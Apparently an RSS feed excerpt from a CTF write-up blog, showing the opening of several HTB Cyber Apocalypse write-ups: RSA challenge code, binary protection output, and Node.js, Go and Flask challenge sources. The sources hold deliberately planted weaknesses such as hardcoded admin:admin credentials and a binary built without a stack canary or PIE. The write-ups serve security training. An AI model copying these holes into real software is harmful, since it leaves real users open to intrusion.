&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">return&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">pow&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk9 mtki">plaintext&lt;/span>&lt;span class="mtk1">, &lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">e&lt;/span>&lt;span class="mtk1">, &lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">n&lt;/span>&lt;span class="mtk1">)&lt;/span>


&lt;span class="mtk7 mtki">def&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">menu&lt;/span>&lt;span class="mtk1">():&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">print&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk4">'[E]ncrypt the flag.'&lt;/span>&lt;span class="mtk1">)&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">print&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk4">'[A]bort training.&lt;/span>&lt;span class="mtk6">\n&lt;/span>&lt;span class="mtk4">'&lt;/span>&lt;span class="mtk1">)&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">return&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">input&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk4">'&amp;gt; '&lt;/span>&lt;span class="mtk1">).&lt;/span>&lt;span class="mtk8">upper&lt;/span>&lt;span class="mtk1">()[&lt;/span>&lt;span class="mtk6">0&lt;/span>&lt;span class="mtk1">]&lt;/span>


&lt;span class="mtk7 mtki">def&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">main&lt;/span>&lt;span class="mtk1">():&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">print&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk4">'This is the second level of training.&lt;/span>&lt;span class="mtk6">\n&lt;/span>&lt;span class="mtk4">'&lt;/span>&lt;span class="mtk1">)&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">while&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk6">True&lt;/span>&lt;span class="mtk1">:&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">rsa&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8 mtku">RSA&lt;/span>&lt;span class="mtk1">()&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">choice&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">menu&lt;/span>&lt;span class="mtk1">()&lt;/span>

&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">if&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">choice&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">==&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk4">'E'&lt;/span>&lt;span class="mtk1">:&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">encrypted_flag&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">rsa&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk8">encrypt&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk1">FLAG&lt;/span>&lt;span class="mtk1">)&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">print&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk7 mtki">f&lt;/span>&lt;span class="mtk4">'&lt;/span>&lt;span class="mtk6">\n&lt;/span>&lt;span class="mtk4">The public key is:&lt;/span>&lt;span class="mtk6">\n\n&lt;/span>&lt;span class="mtk4">N: &lt;/span>&lt;span class="mtk6">{&lt;/span>&lt;span class="mtk1">rsa&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">n&lt;/span>&lt;span class="mtk6">}\n&lt;/span>&lt;span class="mtk4">e: &lt;/span>&lt;span class="mtk6">{&lt;/span>&lt;span class="mtk1">rsa&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">e&lt;/span>&lt;span class="mtk6">}\n&lt;/span>&lt;span class="mtk4">'&lt;/span>&lt;span class="mtk1">)&lt;/span> 
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">print&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk7 mtki">f&lt;/span>&lt;span class="mtk4">'The encrypted flag is: &lt;/span>&lt;span class="mtk6">{&lt;/span>&lt;span class="mtk1">encrypted_flag&lt;/span>&lt;span class="mtk6">}\n&lt;/span>&lt;span class="mtk4">'&lt;/span>&lt;span class="mtk1">)&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">elif&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">choice&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">==&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk4">'A'&lt;/span>&lt;span class="mtk1">:&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">print&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk4">'&lt;/span>&lt;span class="mtk6">\n&lt;/span>&lt;span class="mtk4">Goodbye&lt;/span>&lt;span class="mtk6">\n&lt;/span>&lt;span class="mtk4">'&lt;/span>&lt;span class="mtk1">)&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">exit&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk5">-&lt;/span>&lt;span class="mtk6">1&lt;/span>&lt;span class="mtk1">)&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">else&lt;/span>&lt;span class="mtk1">:&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">print&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk4">'&lt;/span>&lt;span class="mtk6">\n&lt;/span>&lt;span class="mtk4">Invalid choice!&lt;/span>&lt;span class="mtk6">\n&lt;/span>&lt;span class="mtk4">'&lt;/span>&lt;span class="mtk1">)&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">exit&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk5">-&lt;/span>&lt;span class="mtk6">1&lt;/span>&lt;span class="mtk1">)&lt;/span>


&lt;span class="mtk5">if&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">__name__&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">==&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk4">'__main__'&lt;/span>&lt;span class="mtk1">:&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">main&lt;/span>&lt;span class="mtk1">()&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>

&lt;p>The server is using RSA to encrypt the flag (option &lt;code>E&lt;/code>):&lt;/p></description></item><item><title>Sound of Silence</title><link>https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/sound-of-silence/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/sound-of-silence/</guid><description>&lt;p>We are given a 64-bit binary called &lt;code>sound_of_silence&lt;/code>:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2">&lt;code class="no-highlight">Arch: amd64-64-little
RELRO: &lt;span class="code-dark-yellow">Partial RELRO&lt;/span>
Stack: &lt;span class="code-dark-red">No canary found&lt;/span>
NX: &lt;span class="code-dark-green">NX enabled&lt;/span>
PIE: &lt;span class="code-dark-red">No PIE (0x400000)&lt;/span> 
&lt;/code>&lt;/pre>&lt;/div>

&lt;p>We also have the remote Glibc library and loader:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2">&lt;code class="no-highlight">&lt;span class="code-cyan">$&lt;/span> &lt;span class="code-dark-green">glibc/ld-linux-x86-64.so.2&lt;/span> &lt;span class="mtku">glibc/libc.so.6&lt;/span>
GNU C Library (Ubuntu GLIBC 2.35-0ubuntu3.4) stable release version 2.35. 
Copyright (C) 2022 Free Software Foundation, Inc.
This is free software; see the source for copying conditions.
There is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A
PARTICULAR PURPOSE.
Compiled by GNU CC version 11.4.0.
libc ABIs: UNIQUE IFUNC ABSOLUTE
For bug reporting instructions, please see:
&amp;lt;https://bugs.launchpad.net/ubuntu/+source/glibc/+bugs&amp;gt;.
&lt;/code>&lt;/pre>&lt;/div>

&lt;h2 id="reverse-engineering">Reverse engineering&lt;/h2>
&lt;p>If we open the binary in Ghidra, we will see this simple &lt;code>main&lt;/code> function:&lt;/p></description></item><item><title>SpyBug</title><link>https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/spybug/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/spybug/</guid><description>&lt;p>We are given a website like this:&lt;/p>
&lt;p>&lt;img alt="SpyBug 1" src="https://7rocky.github.io/images/other/HTB%20Cyber%20Apocalypse%202023/SpyBug-1.webp">&lt;/p>
&lt;p>We also have the source code of the web application in Node.js and the source code of an agent in Go.&lt;/p>
&lt;h2 id="source-code-analysis">Source code analysis&lt;/h2>
&lt;p>The web application is built with Express JS. In &lt;code>index.js&lt;/code> we can see a Content Security Policy (CSP) header and a function &lt;code>visitPanel&lt;/code> that runs every minute:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2">&lt;code class="no-highlight">&lt;span class="mtk1">application&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk8">use&lt;/span>&lt;span class="mtk1">((&lt;/span>&lt;span class="mtk9 mtki">req&lt;/span>&lt;span class="mtk1">, &lt;/span>&lt;span class="mtk9 mtki">res&lt;/span>&lt;span class="mtk1">, &lt;/span>&lt;span class="mtk8">next&lt;/span>&lt;span class="mtk1">) &lt;/span>&lt;span class="mtk7 mtki">=&amp;gt;&lt;/span>&lt;span class="mtk1"> {&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk9 mtki">res&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk8">setHeader&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk4">"Content-Security-Policy"&lt;/span>&lt;span class="mtk1">, &lt;/span>&lt;span class="mtk4">"script-src 'self'; frame-ancestors 'none'; object&lt;/span>&lt;span class="mtk4">-src 'none'; base-uri 'none';"&lt;/span>&lt;span class="mtk1">);&lt;/span> 
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk9 mtki">res&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk8">setHeader&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk4">"Cache-Control"&lt;/span>&lt;span class="mtk1">, &lt;/span>&lt;span class="mtk4">"no-cache, no-store, must-revalidate"&lt;/span>&lt;span class="mtk1">);&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk9 mtki">res&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk8">setHeader&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk4">"Pragma"&lt;/span>&lt;span class="mtk1">, &lt;/span>&lt;span class="mtk4">"no-cache"&lt;/span>&lt;span class="mtk1">);&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk9 mtki">res&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk8">setHeader&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk4">"Expires"&lt;/span>&lt;span class="mtk1">, &lt;/span>&lt;span class="mtk4">"0"&lt;/span>&lt;span class="mtk1">);&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">next&lt;/span>&lt;span class="mtk1">();&lt;/span>
&lt;span class="mtk1">});&lt;/span>

&lt;span class="mtk1">application&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk8">set&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk4">"view engine"&lt;/span>&lt;span class="mtk1">, &lt;/span>&lt;span class="mtk4">"pug"&lt;/span>&lt;span class="mtk1">);&lt;/span>

&lt;span class="mtk1">application&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk8">use&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk1">genericRoutes&lt;/span>&lt;span class="mtk1">);&lt;/span>
&lt;span class="mtk1">application&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk8">use&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk1">panelRoutes&lt;/span>&lt;span class="mtk1">);&lt;/span>
&lt;span class="mtk1">application&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk8">use&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk1">agentRoutes&lt;/span>&lt;span class="mtk1">);&lt;/span>

&lt;span class="mtk1">application&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk8">listen&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk1">process&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">env&lt;/span>&lt;span class="mtk1">.API_PORT, &lt;/span>&lt;span class="mtk4">"0.0.0.0"&lt;/span>&lt;span class="mtk1">, &lt;/span>&lt;span class="mtk5">async&lt;/span>&lt;span class="mtk1"> () &lt;/span>&lt;span class="mtk7 mtki">=&amp;gt;&lt;/span>&lt;span class="mtk1"> {&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">console&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk8">log&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk4">`Listening on port &lt;/span>&lt;span class="mtk5">${&lt;/span>&lt;span class="mtk1">process&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">env&lt;/span>&lt;span class="mtk1">.API_PORT&lt;/span>&lt;span class="mtk5">}&lt;/span>&lt;span class="mtk4">`&lt;/span>&lt;span class="mtk1">);&lt;/span>
&lt;span class="mtk1">});&lt;/span>

&lt;span class="mtk8">createAdmin&lt;/span>&lt;span class="mtk1">();&lt;/span>
&lt;span class="mtk7">setInterval&lt;/span>&lt;span class="mtk1">(visitPanel, &lt;/span>&lt;span class="mtk6">60000&lt;/span>&lt;span class="mtk1">);&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>

&lt;p>The CSP is very strict, we can see some comments on it in a &lt;a target="_blank" href="https://csp-evaluator.withgoogle.com">CSP evaluator&lt;/a>:&lt;/p></description></item><item><title>Testimonial</title><link>https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/testimonial/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/testimonial/</guid><description>&lt;p>We are given the following website:&lt;/p>
&lt;p>&lt;img alt="Testimonial 1" src="https://7rocky.github.io/images/other/HTB%20Cyber%20Apocalypse%202024/Testimonial-1.webp">&lt;/p>
&lt;p>Moreover, we have a gRPC endpoint at &lt;code>94.237.49.166:58578&lt;/code>.&lt;/p>
&lt;p>We are also given the source code of the project in Go.&lt;/p>
&lt;h2 id="source-code-analysis">Source code analysis&lt;/h2>
&lt;p>This is the main file (&lt;code>main.go&lt;/code>):&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2">&lt;code class="no-highlight">&lt;span class="mtk5">package&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8 mtku">main&lt;/span>

&lt;span class="mtk5">import&lt;/span>&lt;span class="mtk1"> (&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk4">"&lt;/span>&lt;span class="mtk4 detected-link">embed&lt;/span>&lt;span class="mtk4">"&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk4">"&lt;/span>&lt;span class="mtk4 detected-link">htbchal/handler&lt;/span>&lt;span class="mtk4">"&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk4">"&lt;/span>&lt;span class="mtk4 detected-link">htbchal/pb&lt;/span>&lt;span class="mtk4">"&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk4">"&lt;/span>&lt;span class="mtk4 detected-link">log&lt;/span>&lt;span class="mtk4">"&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk4">"&lt;/span>&lt;span class="mtk4 detected-link">net&lt;/span>&lt;span class="mtk4">"&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk4">"&lt;/span>&lt;span class="mtk4 detected-link">net/http&lt;/span>&lt;span class="mtk4">"&lt;/span>

&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk4">"&lt;/span>&lt;span class="mtk4 detected-link">github.com/go-chi/chi/v5&lt;/span>&lt;span class="mtk4">"&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk4">"&lt;/span>&lt;span class="mtk4 detected-link">google.golang.org/grpc&lt;/span>&lt;span class="mtk4">"&lt;/span>
&lt;span class="mtk1">)&lt;/span>

&lt;span class="mtk3">//go:embed public&lt;/span>
&lt;span class="mtk5">var&lt;/span>&lt;span class="mtk1"> FS &lt;/span>&lt;span class="mtk8 mtku">embed&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk8 mtku">FS&lt;/span>

&lt;span class="mtk5">func&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">main&lt;/span>&lt;span class="mtk1">() {&lt;/span>
&lt;span class="mtk1"> router &lt;/span>&lt;span class="mtk5">:=&lt;/span>&lt;span class="mtk1"> chi.&lt;/span>&lt;span class="mtk8">NewMux&lt;/span>&lt;span class="mtk1">()&lt;/span>

&lt;span class="mtk1"> router.&lt;/span>&lt;span class="mtk8">Handle&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk4">"/*"&lt;/span>&lt;span class="mtk1">, http.&lt;/span>&lt;span class="mtk8">StripPrefix&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk4">"/"&lt;/span>&lt;span class="mtk1">, http.&lt;/span>&lt;span class="mtk8">FileServer&lt;/span>&lt;span class="mtk1">(http.&lt;/span>&lt;span class="mtk8">FS&lt;/span>&lt;span class="mtk1">(FS))))&lt;/span> 
&lt;span class="mtk1"> router.&lt;/span>&lt;span class="mtk8">Get&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk4">"/"&lt;/span>&lt;span class="mtk1">, handler.&lt;/span>&lt;span class="mtk8">MakeHandler&lt;/span>&lt;span class="mtk1">(handler.HandleHomeIndex))&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">go&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">startGRPC&lt;/span>&lt;span class="mtk1">()&lt;/span>
&lt;span class="mtk1"> log.&lt;/span>&lt;span class="mtk8">Fatal&lt;/span>&lt;span class="mtk1">(http.&lt;/span>&lt;span class="mtk8">ListenAndServe&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk4">":1337"&lt;/span>&lt;span class="mtk1">, router))&lt;/span>
&lt;span class="mtk1">}&lt;/span>

&lt;span class="mtk5">type&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8 mtku">server&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">struct&lt;/span>&lt;span class="mtk1"> {&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8 mtku">pb&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk8 mtku">RickyServiceServer&lt;/span>
&lt;span class="mtk1">}&lt;/span>

&lt;span class="mtk5">func&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">startGRPC&lt;/span>&lt;span class="mtk1">() &lt;/span>&lt;span class="mtk7 mtki">error&lt;/span>&lt;span class="mtk1"> {&lt;/span>
&lt;span class="mtk1"> lis, err &lt;/span>&lt;span class="mtk5">:=&lt;/span>&lt;span class="mtk1"> net.&lt;/span>&lt;span class="mtk8">Listen&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk4">"tcp"&lt;/span>&lt;span class="mtk1">, &lt;/span>&lt;span class="mtk4">":50045"&lt;/span>&lt;span class="mtk1">)&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">if&lt;/span>&lt;span class="mtk1"> err &lt;/span>&lt;span class="mtk5">!=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk6">nil&lt;/span>&lt;span class="mtk1"> {&lt;/span>
&lt;span class="mtk1"> log.&lt;/span>&lt;span class="mtk8">Fatal&lt;/span>&lt;span class="mtk1">(err)&lt;/span>
&lt;span class="mtk1"> }&lt;/span>
&lt;span class="mtk1"> s &lt;/span>&lt;span class="mtk5">:=&lt;/span>&lt;span class="mtk1"> grpc.&lt;/span>&lt;span class="mtk8">NewServer&lt;/span>&lt;span class="mtk1">()&lt;/span>

&lt;span class="mtk1"> pb.&lt;/span>&lt;span class="mtk8">RegisterRickyServiceServer&lt;/span>&lt;span class="mtk1">(s, &lt;/span>&lt;span class="mtk5">&amp;amp;&lt;/span>&lt;span class="mtk8 mtku">server&lt;/span>&lt;span class="mtk1">{})&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">if&lt;/span>&lt;span class="mtk1"> err &lt;/span>&lt;span class="mtk5">:=&lt;/span>&lt;span class="mtk1"> s.&lt;/span>&lt;span class="mtk8">Serve&lt;/span>&lt;span class="mtk1">(lis); err &lt;/span>&lt;span class="mtk5">!=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk6">nil&lt;/span>&lt;span class="mtk1"> {&lt;/span>
&lt;span class="mtk1"> log.&lt;/span>&lt;span class="mtk8">Fatal&lt;/span>&lt;span class="mtk1">(err)&lt;/span>
&lt;span class="mtk1"> }&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">return&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk6">nil&lt;/span>
&lt;span class="mtk1">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>

&lt;p>As can be seen, it uses a handler to manage HTTP requests (&lt;code>handler/home.go&lt;/code>):&lt;/p></description></item><item><title>TrapTrack</title><link>https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/traptrack/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/traptrack/</guid><description>&lt;p>We are given a website like this:&lt;/p>
&lt;p>&lt;img alt="TrapTrack 1" src="https://7rocky.github.io/images/other/HTB%20Cyber%20Apocalypse%202023/TrapTrack-1.webp">&lt;/p>
&lt;p>We are also given the source code of the project.&lt;/p>
&lt;h2 id="website-functionality">Website functionality&lt;/h2>
&lt;p>The web application allows us to enter URLs that will be stored in a SQLite3 database. Just reading the code from &lt;code>challenge/application/config.py&lt;/code>, we have valid credentials (&lt;code>admin:admin&lt;/code>):&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2">&lt;code class="no-highlight">&lt;span class="mtk5">from&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8 mtku">application&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk8 mtku">util&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">import&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">generate&lt;/span>
&lt;span class="mtk5">import&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8 mtku">os&lt;/span>

&lt;span class="mtk7 mtki">class&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8 mtku">Config&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk8 mtku">object&lt;/span>&lt;span class="mtk1">):&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">SECRET_KEY&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">generate&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk6">50&lt;/span>&lt;span class="mtk1">)&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">ADMIN_USERNAME&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk4">'admin'&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">ADMIN_PASSWORD&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk4">'admin'&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">SESSION_PERMANENT&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk6">False&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">SESSION_TYPE&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk4">'filesystem'&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">SQLALCHEMY_DATABASE_URI&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk4">'sqlite:////tmp/database.db'&lt;/span> 
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">REDIS_HOST&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk4">'127.0.0.1'&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">REDIS_PORT&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk6">6379&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">REDIS_JOBS&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk4">'jobs'&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">REDIS_QUEUE&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk4">'jobqueue'&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">REDIS_NUM_JOBS&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk6">100&lt;/span>

&lt;span class="mtk7 mtki">class&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8 mtku">ProductionConfig&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk8 mtku">Config&lt;/span>&lt;span class="mtk1">):&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">pass&lt;/span>

&lt;span class="mtk7 mtki">class&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8 mtku">DevelopmentConfig&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk8 mtku">Config&lt;/span>&lt;span class="mtk1">):&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">DEBUG&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk6">True&lt;/span>

&lt;span class="mtk7 mtki">class&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8 mtku">TestingConfig&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk8 mtku">Config&lt;/span>&lt;span class="mtk1">):&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">TESTING&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk6">True&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>

